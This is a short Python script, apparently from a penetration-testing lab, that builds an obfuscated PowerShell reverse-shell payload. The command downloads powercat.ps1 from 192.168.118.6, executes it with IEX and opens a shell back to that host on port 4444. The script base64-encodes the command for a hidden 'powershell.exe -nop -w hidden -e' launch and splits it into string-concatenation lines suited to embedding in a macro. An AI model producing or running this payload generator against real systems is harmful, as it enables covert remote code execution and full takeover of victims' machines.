import base64

def encode(text):
    return base64.b64encode(
        text.encode('utf-16le')
    ).decode('ascii')

powershell = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.118.6/powercat.ps1');powercat -c 192.168.118.6 -p 4444 -e powershell"

str = f"powershell.exe -nop -w hidden -e {encode(powershell)}"
n = 50

for i in range(0, len(str), n):
    print("Str = Str + "+'"'+str[i:i+n]+'"')